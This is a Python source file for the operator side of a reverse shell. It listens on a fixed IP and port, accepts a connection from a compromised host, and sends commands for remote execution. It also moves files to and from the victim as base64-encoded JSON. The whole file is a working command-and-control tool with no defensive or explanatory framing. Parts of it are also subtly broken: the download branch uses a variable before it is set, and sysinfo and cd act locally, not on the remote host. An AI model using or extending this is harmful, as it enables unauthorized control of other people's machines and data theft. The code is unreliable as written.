import socket 
import subprocess
import json
import os
import platform
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.conn, addr = listener.accept()
        print("[+] Got a connection from " + str(addr))

    def send_reliable_data(self, data):
        json_data = json.dumps(data)
        # json_data = json_data.encode('utf-8')
        self.conn.send(json_data.encode())

    def receive_reliable_data(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.conn.recv(1024)
                # json_data = json_data.decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_dir(self, path):
        os.chdir(path)
        return 'Change Working Directory to ' + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            # content = content.decode()
            file.write(base64.b64decode(content.encode()))
            return "[+] Download Successful..."

    def read_files(self, file_path):
        with open(file_path, "rb") as file:
            return base64.b64encode(file.read())


    def sys_info(self, uname):
        uname = platform.uname()
        print('='*40, 'System Information', '='*40)
        system = uname.system
        node = uname.node
        release = uname.release
        version = uname.version
        # print('System Information: ', {system})
        # print("System Node: ", {node})
        # print("System Release: ", {release})
        # print("System Version: ", {version})
        sysinfo = {'System Information': system, 'System Node': node, 'System Release':release, 'System Version': version}
        print(sysinfo)



    def remote_execute(self, command):
            self.send_reliable_data(command)
            return self.receive_reliable_data() 

    def run(self):
        while True:
            command = input('>> ')
            command = command.split(" ")
            if command[0] == 'exit':
                self.conn.close()
                exit()
            # elif command == self.execute_sys_commands:
            #     return self.execute_sys_commands
            elif command[0] == 'cd' and len(command) > 2:
                command[1] = " ".join(command[1:])
                result = self.change_working_dir(command[1])
            elif command[0] == 'sysinfo':
                result = self.sys_info(command[0])
            elif command[0] == 'download':
                result = self.write_file(command[1], result)
            elif command[0] == 'upload':
                contents = self.read_files(command[1])
                command.append(contents)
                result = self.remote_execute(command)
            else:
                result = self.remote_execute(command)
            print(result)

listen = Listener('10.0.2.15', 4455)
listen.run()